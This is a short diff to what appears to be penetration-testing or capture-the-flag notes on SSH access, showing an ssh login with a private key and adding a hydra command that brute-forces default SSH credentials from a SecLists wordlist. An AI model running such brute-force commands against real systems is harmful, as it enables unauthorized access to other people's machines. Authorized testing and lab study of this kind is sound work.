@@ -21,3 +21,7 @@ Then
     ssh -i id_rsa -p 2222 noman@ip
 
     user/.ssh/authorized key
+
+#### 4) Brute force default SSH credentials
+
+    hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt IP ssh
